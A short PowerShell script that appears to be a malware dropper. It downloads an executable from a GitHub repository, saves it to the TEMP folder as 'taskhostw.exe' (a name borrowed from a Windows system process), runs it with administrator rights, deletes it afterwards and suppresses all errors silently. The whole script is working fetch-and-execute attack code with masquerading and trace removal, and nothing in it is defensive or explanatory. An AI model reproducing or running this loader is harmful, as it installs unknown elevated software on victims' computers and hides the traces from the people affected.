$exeUrl = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/taskhostw.exe"
$tempPath = "$env:TEMP\taskhostw.exe"

function Clean-Up {
    if (Test-Path $tempPath) {
        Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
    }
}

try {
    # Set TLS for older Windows versions
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    # Download file
    Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -ErrorAction Stop

    # Run as Admin and Wait
    if (Test-Path $tempPath) {
        Start-Process -FilePath $tempPath -Verb RunAs -Wait
    }
}
catch {
    # No Thai characters to prevent encoding errors
}
finally {
    Clean-Up
}
